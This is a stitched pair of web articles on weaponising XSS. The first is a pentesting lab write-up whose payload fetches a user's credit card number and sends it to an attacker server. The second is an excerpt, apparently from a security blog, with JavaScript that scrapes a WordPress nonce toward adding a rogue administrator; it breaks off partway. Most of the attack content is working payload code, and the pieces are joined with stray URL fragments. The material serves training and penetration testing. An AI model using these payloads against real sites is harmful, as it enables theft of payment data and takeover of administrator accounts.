

##
#
https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/
##
#
https://www.trustedsec.com/blog/tricks-for-weaponizing-xss/
#
##
#
##

XSS - Ex-filtrating data with XMLHttpRequest(): JS for Pentesters task 15 write up
Nov 1, 2014 • jsp, javascript, xss, security-tube

writeup for task-15 of the JS for pentesters series by security-tube - Ex-filtrating data with XMLHttpRequest()
Till now we have seen 2 different challenges with XMLHttpRequest() with GET request. Now let us look into a challenge were we need to post data not by GET method but by POST method. Let us look into the challenge:

JS for Pentesters task 15

Our Objective of the challenge is to Find John’s Credit Card Number using an XSS vulnerability on this page and post the Credit Card Number to your Attacker Server. Here as we stated above, the key difference is that we should do a POST request to the server. Let us look into the correct payload:

```
    <script>
    var xhr = new XMLHttpRequest();    
    xhr.open('POST', 'http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.onload = function () {
    var request = new XMLHttpRequest();
    request.open('GET', 'http://localhost:8000/?creditcard='+xhr.responseText, true);
    request.send()
    };
    xhr.send('user=john');
    </script>
```

So what have we done above ? We have created a new XMLHttpRequest() object and then we opened the link by specifying the request type as POST. Then we used the setRequestHeader() so that the entire URL should be properly encoded or else it won’t work. After that, its all normal procedure like we did before. A small difference is that we are declaring one more XMLHttpRequest() object inside the onload since we need to post it our server also. You can do that without XMLHttpRequest too but I just prefer to use it. In the xhr.send(), inside the brackets, we gave the POST parameters and here, it is user=john.

Note:

1) If you didn’t understand the payload properly, I strongly recommend you read the basics of XMLHttpRequest() first and then try again.

2) While playing with XSS challenges, it is always recommended to use Mozilla Firefox because Google chrome has inbuilt XSS stopper which will stop us from executing arbitrary JavaScript code even if the page is vulnerable to XSS. So its strongly recommended to use Firefox instead of chrome.

3) You have to URL encode the payload before the injection via the url parameter or else this will fail to work

We hope that you really liked this challenge. If there is anything you didn’t understand or wanted to get more clarity, please comment down and we are more than happy to help. Also, if you get a better way of solving the challenge, please share it with us and we are happy to learn from our readers too. Happy pentesting..



Figure 19: Finding the Original Nonce Value
To complete the new administrator attack, we need some additional code to fetch the user-new.php page and parse out the nonce value before we construct and send our malicious POST request.

First, we need a helper function to help format the server responses. That function is:

function read_body(xhr)
 {
   var data;
   if (!xhr.responseType || xhr.responseType === “text”)
   {
     data = xhr.responseText;
   }
   else if (xhr.responseType === “document”)
   {
     data = xhr.responseXML;
   }
   else if (xhr.responseType === “json”)
   {
     data = xhr.responseJSON;
   }
   else
   {
     data = xhr.response;
   }
   return data;
 }
Next, we need a function to get the page with the nonce value. The URI is the same value that we used in our POST request.

function findNonce()
 {
   var uri = “/wp-admin/user-new.php”;
   xhr = new XMLHttpRequest();
   xhr.open(“GET”, uri, true);
   xhr.send(null);
 }
Note that this XHR request is using a GET request instead of the POST request in our previous function. This code will retrieve the user-new.php page for us. Now we need to do something with the response.

Up until now, we have not had to wait for our request to finish. We do have to worry about that now. We will add some code that will wait until our GET request has completed.

xhr.onreadystatechange = function()
 {
   if (xhr.readyState == XMLHttpRequest.DONE)
   {
     // do something
   }
 }
The inner bracket where the “// do something” comment is will not execute until our GET request has completed. This is where we need to put our response parsing code that will find our nonce value. We can add the following code in the inner bracket:

…
var response = read_body(xhr);
…

We are passing our XHR request to the read_body helper function that we added, and we are getting back the response as text and saving it in a response variable. This variable now holds the full HTML content of that page, including the add new user form and the nonce value!

There is a lot of content in that response and we want to narrow down to our nonce. Let’s look at the nonce again in the HTML.


Figure 20: Nonce Value in Server Response
We can search for this code in the response. A good string to search for might be ‘‘name=”_wpnonce_create-user” value=”’. That string should be static, and right after the ‘value=’ is the actual content we need to isolate. We can find this string in our response with the following code:

…
var noncePos = response.indexOf(‘name=”_wpnonce_create-user” value=”‘);
console.log(“Nonce string index is: “ + noncePos);
…

This will find the index of this string in the response. We can put this all together and print out this index.

```
function findNonce()
 {
   var uri = “/wp-admin/user-new.php”;
   xhr = new XMLHttpRequest();
   xhr.open(“GET”, uri, true);
   xhr.send(null);
   xhr.onreadystatechange = function()
   {
     if (xhr.readyState == XMLHttpRequest.DONE)
     {
       // do something
       var response = read_body(xhr);
       var noncePos = response.indexOf(‘name=”_wpnonce_create-user” value=”‘);
       console.log(“Nonce string index is: “ + noncePos);
     }
   }
 }
 
``` 
We copy this function and the helper read_body() function into the payload.js and call it.
